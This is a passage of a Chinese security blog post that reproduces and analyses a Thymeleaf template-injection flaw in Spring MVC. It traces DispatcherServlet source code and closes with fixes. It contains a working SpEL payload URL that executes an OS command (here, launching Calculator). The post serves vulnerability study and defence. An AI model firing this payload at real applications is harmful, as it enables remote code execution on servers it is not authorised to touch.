class=\"string\">&quot;index...&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> index;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>正常访问URL，出现了500报错，因为此时我没有对应的模板文件才会报错，但是这个不影响漏洞的利用</p>\n<p><img src=\"9PW7aCWq0XIh8hrnZNkKgFlyqLTnstDjCszcSJRwe8w.png\" alt=\"image\"></p>\n<h2 id=\"复现\"><a href=\"#复现\" class=\"headerlink\" title=\"复现\"></a>复现</h2><p>payload</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">192.168</span><span class=\"number\">.163</span><span class=\"number\">.154</span>:<span class=\"number\">8090</span>/index1/index2?index3=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22open%<span class=\"number\">20</span>-a%20Calculator%<span class=\"number\">22</span>).getInputStream()).next()%7d__::.x</span><br></pre></td></tr></table></figure>\n<p><img src=\"w46yACUTr-5KrP5NK2MiVbv5Uan0SUbiGgyxdjkaVKU.png\" alt=\"image\"></p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p>先讲一下SpringMVC的一个工作流程</p>\n<ol>\n<li>客户端发起 HTTP 请求，请求会到达 DispatcherServlet。</li>\n<li>DispatcherServlet 接收到请求后会通过 HandlerMapping 确定当前请求需要调用哪个 Controller 对象，默认情况下使用的是 RequestMappingHandlerMapping。</li>\n<li>HandlerAdapter 负责将请求与 Controller 方法进行绑定，并处理方法的参数，准备请求数据。</li>\n<li>Controller 执行相应的业务逻辑，创建并绑定 Model 和 View，并返回 ModelAndView。</li>\n<li>ViewResolver 根据 View 的指定格式解析目标视图为完整的视图，并返回给 DispatcherServlet。</li>\n<li>DispatcherServlet 发送 Model 数据给 View 以便完成渲染，生成最终的响应结果。</li>\n<li>最终的响应结果返回给客户端浏览器，已经完成了整个 Spring MVC 的请求响应过程。</li>\n</ol>\n<p>在Spring MVC框架中是由DispatcherServlet作为前端控制器（Front Controller）来控制请求和响应、路由请求和处理 HTTP 请求的。</p>\n<p>org.springframework.web.servlet.DispatcherServlet</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.garck3h.controller;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.context.request.ServletWebRequest;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.context.request.async.WebAsyncManager;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.context.request.async.WebAsyncUtils;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.servlet.HandlerAdapter;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.servlet.HandlerExecutionChain;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.servlet.ModelAndView;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.util.NestedServletException;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Created by IntelliJ IDEA.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Author</span> Garck3h</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Date</span> 2023/5/18 4:19 下午</span></span><br><span class=\"line\"><span class=\"comment\"> * Life is endless, and there is no end to it.</span></span><br><span class=\"line\"><span class=\"comment\"> **/</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">doDispath</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title function_\">doDispatch</span><span class=\"params\">(HttpServletRequest request, HttpServletResponse response)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">         <span class=\"comment\">// 对于multipart类型需要特殊处理</span></span><br><span class=\"line\">        <span class=\"type\">HttpServletRequest</span> <span class=\"variable\">processedRequest</span> <span class=\"operator\">=</span> request;</span><br><span class=\"line\">        <span class=\"type\">HandlerExecutionChain</span> <span class=\"variable\">mappedHandler</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">        <span class=\"type\">boolean</span> <span class=\"variable\">multipartRequestParsed</span> <span class=\"operator\">=</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">WebAsyncManager</span> <span class=\"variable\">asyncManager</span> <span class=\"operator\">=</span> WebAsyncUtils.getAsyncManager(request);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                <span class=\"comment\">//定义模型与视图</span></span><br><span class=\"line\">                <span class=\"type\">ModelAndView</span> <span class=\"variable\">mv</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">                <span class=\"comment\">//异常</span></span><br><span class=\"line\">                <span class=\"type\">Object</span> <span class=\"variable\">dispatchException</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                     <span class=\"comment\">// 预处理multipart文件上传数据，检查请求是否包含multipart/form-data</span></span><br><span class=\"line\">                    processedRequest = <span class=\"built_in\">this</span>.checkMultipart(request);</span><br><span class=\"line\">                    multipartRequestParsed = processedRequest != request;</span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"comment\">// 获取处理器（通过RequestMapping找到希望匹配的处理器）</span></span><br><span class=\"line\">                    mappedHandler = <span class=\"built_in\">this</span>.getHandler(processedRequest);</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (mappedHandler == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                        <span class=\"comment\">// 如果没有找到合适的Handler，则返回404错误页面</span></span><br><span class=\"line\">                        <span class=\"built_in\">this</span>.noHandlerFound(processedRequest, response);</span><br><span class=\"line\">                        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    <span class=\"comment\">// 根据获取的 Handler （处理方法或者对象）获取对应的 HandlerAdapter</span></span><br><span class=\"line\">                    <span class=\"type\">HandlerAdapter</span> <span class=\"variable\">ha</span> <span class=\"operator\">=</span> <span class=\"built_in\">this</span>.getHandlerAdapter(mappedHandler.getHandler());</span><br><span class=\"line\">                    <span class=\"comment\">// 获取 Http 请求方法类型，以 GET 上述情况为例</span></span><br><span class=\"line\">                    <span class=\"type\">String</span> <span class=\"variable\">method</span> <span class=\"operator\">=</span> request.getMethod();</span><br><span class=\"line\">                    <span class=\"type\">boolean</span> <span class=\"variable\">isGet</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;GET&quot;</span>.equals(method);</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (isGet || <span class=\"string\">&quot;HEAD&quot;</span>.equals(method)) &#123;</span><br><span class=\"line\">                        <span class=\"comment\">// 执行 Last-Modified 头信息验证缓存是否需要更新，判断是否需要返回304</span></span><br><span class=\"line\">                        <span class=\"type\">long</span> <span class=\"variable\">lastModified</span> <span class=\"operator\">=</span> ha.getLastModified(request, mappedHandler.getHandler());</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> ((<span class=\"keyword\">new</span> <span class=\"title class_\">ServletWebRequest</span>(request, response)).checkNotModified(lastModified) &amp;&amp; isGet) &#123;</span><br><span class=\"line\">                            <span class=\"keyword\">return</span>;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"comment\">// 判断拦截器是否preHandle执行成功，如果有一个没有执行成功，则直接返回404错误页面；同时记录日志</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (!mappedHandler.applyPreHandle(processedRequest, response)) &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"comment\">// 调用Handler并获取返回结果（该结果严格意义上只是View和Model的容器）</span></span><br><span class=\"line\">                    mv = ha.handle(processedRequest, response, mappedHandler.getHandler());</span><br><span class=\"line\">                    <span class=\"comment\">// 检查异步任务，并不会立即执行，而是由WebAsyncManager 后期完成调度管理</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (asyncManager.isConcurrentHandlingStarted()) &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                        <span class=\"comment\">// 对ModelAndView进行预处理</span></span><br><span class=\"line\">                    <span class=\"built_in\">this</span>.applyDefaultViewName(processedRequest, mv);</span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"comment\">//执行Handler的后置处理器</span></span><br><span class=\"line\">                    mappedHandler.applyPostHandle(processedRequest, response, mv);</span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span> (Exception var20) &#123;</span><br><span class=\"line\">                    dispatchException = var20;</span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span> (Throwable var21) &#123;</span><br><span class=\"line\">                    <span class=\"comment\">// 添加try-catch代码块来捕捉所有Throwable类型的异常</span></span><br><span class=\"line\">                    dispatchException = <span class=\"keyword\">new</span> <span class=\"title class_\">NestedServletException</span>(<span class=\"string\">&quot;Handler dispatch failed&quot;</span>, var21);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"comment\">// 利用返回的mv进行页面渲染</span></span><br><span class=\"line\">                <span class=\"built_in\">this</span>.processDispatchResult(processedRequest, response, mappedHandler, mv, (Exception)dispatchException);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (Exception var22) &#123;</span><br><span class=\"line\">                <span class=\"built_in\">this</span>.triggerAfterCompletion(processedRequest, response, mappedHandler, var22);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (Throwable var23) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                 <span class=\"comment\">//对页面渲染完成调用拦截器中的AfterCompletion方法</span></span><br><span class=\"line\">                <span class=\"built_in\">this</span>.triggerAfterCompletion(processedRequest, response, mappedHandler, <span class=\"keyword\">new</span> <span class=\"title class_\">NestedServletException</span>(<span class=\"string\">&quot;Handler processing failed&quot;</span>, var23));</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (asyncManager.isConcurrentHandlingStarted()) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (mappedHandler != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                    mappedHandler.applyAfterConcurrentHandlingStarted(processedRequest, response);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (multipartRequestParsed) &#123;</span><br><span class=\"line\">                <span class=\"comment\">//清除由多个部分组成的请求使用的所有资源</span></span><br><span class=\"line\">                <span class=\"built_in\">this</span>.cleanupMultipart(processedRequest);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n<h3 id=\"doDispatch\"><a href=\"#doDispatch\" class=\"headerlink\" title=\"doDispatch\"></a>doDispatch</h3><p>checkMultipart </p>\n<p>判断请求是否为 Multipart 类型，并对请求处理进行必要的操作</p>\n<p>getHandler </p>\n<p>调用getHandler() 方法来确定具体的 Controller 处理器</p>\n<p>调用各自的 getHandler(request) 方法来获取对应的 HandlerExecutionChain 对象</p>\n<p>这个对象包含了要执行的controller handler和其拦截器链，它是一个管理一组拦截器链的实例，其中包含了一个或多个拦截器 HandlerInterceptor 以及目标对象和目标方法。</p>\n<p>如果某个 HandlerMapping 的 getHandler() 方法返回了该对象，则表示该 HandlerMapping 能够处理当前请求，此时就会将 HandlerExecutionChain 返回给 DispatcherServlet，让其执行相关业务逻辑</p>\n<h3 id=\"1-前端控制器拦截用户的请求\"><a href=\"#1-前端控制器拦截用户的请求\" class=\"headerlink\" title=\"1.前端控制器拦截用户的请求\"></a><strong>1.前端控制器拦截用户的请求</strong></h3><p>我们直接看doDispatch这个方法，首先是和传统的servlet一样传入：HttpServletRequest request, HttpServletResponse response。</p>\n<p>然后就是定义一些各种类型的变量，做初始化操作。</p>\n<p><img src=\"gM4QKwKFcwJHZPVp1K7uRlBPWxxNOfeC5PSvPs1fBjs.png\" alt=\"image\"></p>\n<p>然后来到513行是调用checkMultipart 方法检查是否包含multipart&#x2F;form-data 编码方式，有的话，就进行进一步的处理。514行将 multipartRequestParsed 变量设置为 true。</p>\n<p><img src=\"X8oo0HHQq3yTW7lfM2Ph1H4Mxl7WjJDEojfgzJH7YO0.png\" alt=\"image\"></p>\n<h3 id=\"2-处理器映射器执行用户的请求\"><a href=\"#2-处理器映射器执行用户的请求\" class=\"headerlink\" title=\"2.处理器映射器执行用户的请求\"></a><strong>2.处理器映射器执行用户的请求</strong></h3><p>然后来到515行的getHandler，我们直接进去分析。首先是判断一下handlerMappings是否为空。</p>\n<p><img src=\"pANthOzVC_ScNmdNOWddChdrfod16NZNy7kYrWl0yq0.png\" alt=\"image\"></p>\n<p>handlerMappings的初始化是在initHandlerMappings中进行的，扫描容器中所有的 HandlerMapping Bean，并将这些 Bean 添加到 handlerMappings 列表中。</p>\n<p><img src=\"WN2EnHZ_xyLglPRq-rYXr0xtMRCmtXu5fy-30jvN4qY.png\" alt=\"image\"></p>\n<p>回到getHandler，遍历handlerMappings 列表来查找匹配的处理器（即 Controller），并返回对应的 HandlerExecutionChain 实例。下图可以看到我们的index1的Controller和内置的error Controller</p>\n<p><img src=\"lna3ce4nVCydtd8coNVnehDaYqv_pdcG3qab3DA8MQA.png\" alt=\"image\"></p>\n<p>SpringMVC一共初始化了5个处理器映射器</p>\n<p><img src=\"upJsQXDdiyNT--4vjCqs_oF5wZpxE--M10Eh2bp05dw.png\" alt=\"image\"></p>\n<p>遍历拿到了我们的一个Controller和方法名以及返回值的类型（String）</p>\n<p><img src=\"39o45C1Lf7BSmiT2B3n4TGSAHJUKMR32k_BeKrOhVuc.png\" alt=\"image\"></p>\n<p>映射器给我们处理的Handler封装到了一个叫HandlerExecutionChain里面。而在HandlerExecutionChain对象里面有一个handler对象，是HandlerMethod类型的，这就是处理器映射器最终将我们的请求处理成的Handler对象</p>\n<h3 id=\"3-获取处理器适配器HandlerAdpater\"><a href=\"#3-获取处理器适配器HandlerAdpater\" class=\"headerlink\" title=\"3.获取处理器适配器HandlerAdpater\"></a><strong>3.获取处理器适配器HandlerAdpater</strong></h3><p>回到doDispatch，继续往下走到521行，这里调用了getHandlerAdapter方法。这个步骤是</p>\n<p><img src=\"NYCpxpSlZDfNo3YQWo8WBYj_pNirXQ2_QKgLoLHOW6M.png\" alt=\"image\"></p>\n<p>我们跟进去到了getHandlerAdapter。这里是对所有适配器进行遍历，查找支持该处理程序的适配器，最终将返回第一个支持该处理程序的适配器。并执行所需操作，例如解析请求参数、调用相应的业务逻辑、生成响应等。</p>\n<p><img src=\"G-bRju-URSTl6dq17pXyv2k3DrM-AWKP71tjoXNPyAU.png\" alt=\"image\"></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 获取处理器适配器    </span></span><br><span class=\"line\"><span class=\"keyword\">protected</span> HandlerAdapter <span class=\"title function_\">getHandlerAdapter</span><span class=\"params\">(Object handler)</span> <span class=\"keyword\">throws</span> ServletException &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 处理器适配器集合不为空</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"built_in\">this</span>.handlerAdapters != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">        <span class=\"type\">Iterator</span> <span class=\"variable\">var2</span> <span class=\"operator\">=</span> <span class=\"built_in\">this</span>.handlerAdapters.iterator();</span><br><span class=\"line\">        <span class=\"comment\">// 遍历处理器适配器集合</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span>(var2.hasNext()) &#123;</span><br><span class=\"line\">            <span class=\"type\">HandlerAdapter</span> <span class=\"variable\">adapter</span> <span class=\"operator\">=</span> (HandlerAdapter)var2.next();</span><br><span class=\"line\">            <span class=\"comment\">// 当前适配器是否支持handle处理器的处理</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (adapter.supports(handler)) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// 返回支持的适配器</span></span><br><span class=\"line\">                <span class=\"keyword\">return</span> adapter;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">        <span class=\"comment\">// 未找到合适的适配器，抛出异常</span></span><br><span class=\"line\">    <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ServletException</span>(<span class=\"string\">&quot;No adapter for handler [&quot;</span> + handler + <span class=\"string\">&quot;]: The DispatcherServlet configuration needs to include a HandlerAdapter that supports this handler&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>SpringMVC为我们初始化了以下4个处理器适配器：</p>\n<p><img src=\"tOgIA6c-N2YWDqhwtn2Qbk7k5AghIR-hZCq0HiuS8R4.png\" alt=\"image\"></p>\n<p><img src=\"A_6Jj_ulqGpI4sKH_XdvJLnanMb4cRytlb1jsAMEOzs.png\" alt=\"image\"></p>\n<p>回到doDispatch，继续往下走到531行。判断在请求发生之前有没有预处理拦截器。预处理拦截器一般用于身份验证、授权、日志记录等。</p>\n<p><img src=\"Ha3472ZAU3rQBGcGGP4zuBF0aBIrZCuyVVr2_KdlX4k.png\" alt=\"image\"></p>\n<h3 id=\"4-处理器适配器对Handler进行处理\"><a href=\"#4-处理器适配器对Handler进行处理\" class=\"headerlink\" title=\"4.处理器适配器对Handler进行处理\"></a><strong>4.处理器适配器对Handler进行处理</strong></h3><p>继续往下走到535行。从 mappedHandler对象获取handler对象，然后将其与请求(request)对象、响应(response)对象交给适配器(Adapter)进行调用。在适配器中调用处理程序的相应方法，通常是Controller中的某一个方法，并根据业务逻辑生成响应数据。最终结果存储在ModelAndView实例对象(mv)中。</p>\n<p><img src=\"mz9s1yEdL-un_gS7yP3V-vF9G0Lz8hCmnwX-8V47Z7w.png\" alt=\"image\"></p>\n<p>我们跟进去</p>\n<p><img src=\"64U7bf16Iv-0R3x8a2du3TE39qHgVByo-r2YFHPJGEA.png\" alt=\"image\"></p>\n<p>来到了RequestMappingHandlerAdapter类的handleInternal方法。首先是对请求进行检查(checkRequest)，接着调用invokeHandlerMethod函数执行处理程序(handlerMethod)的方法，并根据业务逻辑生成响应数据。最后，根据配置条件设置缓存控制(Cache-Control)头部信息并返回ModelAndView实例对象(mav)。</p>\n<p><img src=\"fgZ2tlRIQiY911Vkc4MqM2m2gWGsbvHtAaz5M9uZS9U.png\" alt=\"image\"></p>\n<p>来到invokeHandlerMethod(487)，我们跟进去。前面这些是根据请求参数，生成一个Web数据绑定器工厂(binderFactory)和模型工厂(modelFactory)。</p>\n<p><img src=\"zRxC97t-uBwsshqxp42aD7YC_Ch9qSmaLYnOEYP8lTg.png\" alt=\"image\"></p>\n<p>我们来到552行的invocableMethod.invokeAndHandle。它是用于执行处理程序(handlerMethod)的方法。我们跟进去；首先是调用invokeForRequest方法，该方法是实现@RequestBody注解的功能，将http请求报文解析为我们设置的对象。</p>\n<p><img src=\"9rAHyXBKXO7Id7wUFJfOugU6jeHVQMkCY2BBXqsawas.png\" alt=\"image\"></p>\n<p>我们跟进去；首先通过getMethodArgumentValues方法获取处理程序所需的参数，如日志所示，代码将请求参数打印到日志中。然后通过doInvoke方法执行接口的具体业务逻辑代码。</p>\n<p><img src=\"SxJ-W5GrA7Lj7xK4I422RDDOLz3N5jVL2pifCfV-2ig.png\" alt=\"image\"></p>\n<p>跟进61行的doInvoke，进入到里面。 获得被桥接的⽅法（101），开打访问权限（102）</p>\n<p><img src=\"hDXsDmsQ8OKUP42Lt9CpkO3o3phgis_SN1CBQtWKIFY.png\" alt=\"image\"></p>\n<p>这里的105行，调用了invoke。通过反射，调⽤ Controller 中响应的⽅法</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">return</span> KotlinDetector.isSuspendingFunction(method) ? CoroutinesUtils.invokeSuspendingFunction(method, <span class=\"built_in\">this</span>.getBean(), args) : method.invoke(<span class=\"built_in\">this</span>.getBean(), args);</span><br></pre></td></tr></table></figure>\n<p>最后通过反射进行调用。先是检查调用者对方法的访问权限，并获取需要调用方法的MethodAccessor实例，最后调用MethodAccessor的invoke方法来执行相应的方法。</p>\n<p><img src=\"Q1ujRJo4a6PB82VUNdfQm3z1sknvesEAVhwQWRjE19c.png\" alt=\"image\"></p>\n<p>最终回到invokeHandlerMethod，进入到了if里面getModelAndView(554)。</p>\n<p><img src=\"Rxha9Q6rsoH1nWYawYNyaeVr5A09eKm-tMiZy0CpWnc.png\" alt=\"image\"></p>\n<p>我们跟进去看看；这里是根据mavContainer对象（包含视图名称、数据模型等信息）创建并返回ModelAndView对象</p>\n<p><img src=\"v6mT0K9RBwObIUIOod4qs6UuXvkrI6rcll8eMSoPwWA.png\" alt=\"image\"></p>\n<p>至此，我们就拿到了mav，也就是ModelAndView </p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">[view=<span class=\"string\">&quot;__$&#123;new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;</span>open -a Calculator<span class=\"string\">&quot;).getInputStream()).next()&#125;__::.x&quot;</span>; model=&#123;&#125;]</span><br></pre></td></tr></table></figure>\n<p><img src=\"VmLlO7DWY78gR-N4G226bRLW3ViXKVYYVnCmm_kVfQc.png\" alt=\"image\"></p>\n<p>最终回到doDispatch，然后来到540行。</p>\n<p>这里调用请求处理器适配器的postHandle()方法，对Web请求在处理完成后做一些额外的工作，比如在模型和视图参数中添加、删除或修改属性值等，以及对响应对象进行操作，比如设置相应头信息、状态码以及重定向等</p>\n<p><img src=\"XxxuU2r4n3E1mhBz98cQ8EpO5e5cyQvEXA3CS5H3Jcs.png\" alt=\"image\"></p>\n<h3 id=\"5-处理派发结果\"><a href=\"#5-处理派发结果\" class=\"headerlink\" title=\"5.处理派发结果\"></a>5.处理派发结果</h3><p>SpringMVC通过处理器适配器将Handler处理成ModelAndView了。</p>\n<p>下面我们来看到548行</p>\n<p><img src=\"hArY-lvFyp6UFLRTBFmoJ7epnCYupS_c2aCT3w8ZhWE.png\" alt=\"image\"></p>\n<p>我们跟进去看看，processDispatchResult方法实现了请求的分发以及结果的处理。在具体工作中，该方法接收HTTP请求和响应对象、当前匹配到的HandlerExecutionChain处理链、可能存在的ModelAndView模型视图对象以及处理过程中可能抛出的异常等参数，然后根据不同情况，调用相应的方法进行处理。</p>\n<p><img src=\"6LaA8CBRDPXwcBkWLW8Np83AKH9CBoWQcPUdeEVStdU.png\" alt=\"image\"></p>\n<p>搜索发现，有一个叫render的方法对mv进行处理，我们跟进去。</p>\n<p><img src=\"BLLiYnuYt1DGvjZPJyZz3usS8B6dg2M3nbb_jeps36o.png\" alt=\"image\"></p>\n<p>750行获取View视图对象，进去看看。循环遍历初始化好的视图解析器进行解析处理，最终得到一个View视图对象</p>\n<p><img src=\"dASw_k2xVTOLT47G7ts2HTUS_p_mOzxMqupOXiozV6E.png\" alt=\"image\"></p>\n<p>回到render；来到770行，我们跟进去看看。</p>\n<p>这里调用了renderFragment方法</p>\n<p><img src=\"h9ffxi7Kg30LTUg5Nc9oxdQv8kWJr1ZbGWdEZL7AsxU.png\" alt=\"image\"></p>\n<p>继续跟进去renderFragment；在101行，判断viewTemplateName是否包含::如果包含的话进入else分支，进行表达式预处理。</p>\n<p>首先是传入configuration 对象作为参数，获取一个标准表达式解析器对象parser；然后是通过在 parser对象上调用 parseExpression() 方法，传入两个参数：当前渲染的页面上下文对象 context 和表示要渲染的 HTML 片段名称的字符串 “~{ + viewTemplateName + }”，得到一个 FragmentExpression 对象 fragmentExpression</p>\n<p><img src=\"TCrWTzmvZz2PUxJuax8-p7QwkNJ32uWS0ZR0Mpr7TwQ.png\" alt=\"image\"></p>\n<p>此时的viewTemplateName为：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">__$&#123;<span class=\"keyword\">new</span> <span class=\"title class_\">java</span>.util.Scanner(T(java.lang.Runtime).getRuntime().exec(<span class=\"string\">&quot;open -a Calculator&quot;</span>).getInputStream()).next()&#125;__::.x</span><br></pre></td></tr></table></figure>\n<p>viewTemplateName中包含::时，会给其加上~{}然后进行解析</p>\n<p><img src=\"QfzEJJwG2yPvKX6iPU5Zt1vI9B26heyMZlu0i1nzDf8.png\" alt=\"image\"></p>\n<p>parseExpression(109) 我们跟进去看看</p>\n<p><img src=\"Zz-P7UCZAzQ-ITKSeQtqYMXG0xw907ctzUqal1LTuxU.png\" alt=\"image\"></p>\n<p>跟进去preprocess。进行正则提取出__…__之间的东西</p>\n<p><img src=\"Glzsvp8QC3KxO_D6SqF4-rxzC7arF-ymCxjo6WyQh5o.png\" alt=\"image\"></p>\n<p>提取得到的</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">$&#123;<span class=\"keyword\">new</span> <span class=\"title class_\">java</span>.util.Scanner(T(java.lang.Runtime).getRuntime().exec(<span class=\"string\">&quot;open -a Calculator&quot;</span>).getInputStream()).next()&#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"IWGmVxzna6lKOKC953_kqmMj2BPxXnODz7vKo4WCwr0.png\" alt=\"image\"></p>\n<p>然后调用expression.execute（42）</p>\n<p><img src=\"XCNeHvySqccF4wE9w2m6Zft4aD4TJsVUxiVTxBn2euQ.png\" alt=\"image\"></p>\n<p>我们跟进来发现又调用了另一个execute，把this（payload）传进去。</p>\n<p><img src=\"Yi0NliqI420ww5cXZB7tt63D55M2496Ap2ewqBAMvOM.png\" alt=\"image\"></p>\n<p>我们跟进去，一进来就发现第一个if对expression 对象进行类型检测，判断表达式类型是否为 SimpleExpression。这里确实是SimpleExpression，所以调用SimpleExpression.executeSimple进行了执行。</p>\n<p><img src=\"eqE5ZF37w9-TAeou6RLtr7CysxxDD7qMqaAgM23wT2g.png\" alt=\"image\"></p>\n<p>SimpleExpression.executeSimple执行spel表达，成功弹计算器。</p>\n<p><img src=\"FrYU4DJ8NxtpUSPbr2Jti7AuRb8UVhnrVEGasNqltLc.png\" alt=\"image\"></p>\n<p><img src=\"kzystS4Asr-inkRBPQ1i6uhzgS3WHLQMpryrtVhag3M.png\" alt=\"image\"></p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><ul>\n<li>这个漏洞的复现，很多工作都是在跟进SpringMvc的一个工作流程。需要对SpringMvc的工作流程了解，和SpringMvc的九大初始化组件了解，才得以进一步追踪污染传播的方法以及整个流程。</li>\n<li>在通过render 渲染进行视图渲染的时候，会先检测是否包含“::”，然后进入分支添加上~{}进行解析。解析前进行预处理，即通过正则取出两个横线之间的内容，然后调用标准解析器对其进行解析，匹配到了spel表达式，从而导致了spel表达式命令执行。</li>\n</ul>\n<p><img src=\"o27q8Sx0mxQMudsxOj5utgUcxpEht3cqcsFU6R3mogU.png\" alt=\"image\"></p>\n<h2 id=\"修复方式\"><a href=\"#修复方式\" class=\"headerlink\" title=\"修复方式\"></a>修复方式</h2><ul>\n<li>升级版本</li>\n<li>配置 <code>@ResponseBody</code> 或者 <code>@RestController</code></li>\n</ul>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">这样 spring 框架就不会将其解析为视图名，而是直接返回, 不再调用模板解析。</span><br></pre></td></tr></table></figure>\n<ul>\n<li>在返回值前面加上 “redirect:”</li>\n</ul>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">这样不再由 Spring ThymeleafView来进行解析，而是由 RedirectView 来进行解析。</span><br></pre></td></tr></table></figure>\n<ul>\n<li>在方法参数中加上 HttpServletResponse 参数</li>\n</ul>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">由于controller的参数被设置为HttpServletResponse，Spring认为它已经处理了HTTP Response，因此不会发生视图名称解析。</span><br></pre></td></tr></table></figure>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><p><a href=\"https://blog.csdn.net/weixin_43263451/article/details/126543803\">https://blog.csdn.net/weixin_43263451&#x2F;article&#x2F;details&#x2F;126543803</a></p>\n<p><a href=\"https://mp.weixin.qq.com/s/u2ooYhAZ0Elbe02PDNQBWw\">https://mp.weixin.qq.com/s/u2ooYhAZ0Elbe02PDNQBWw</a></p>\n<p><a 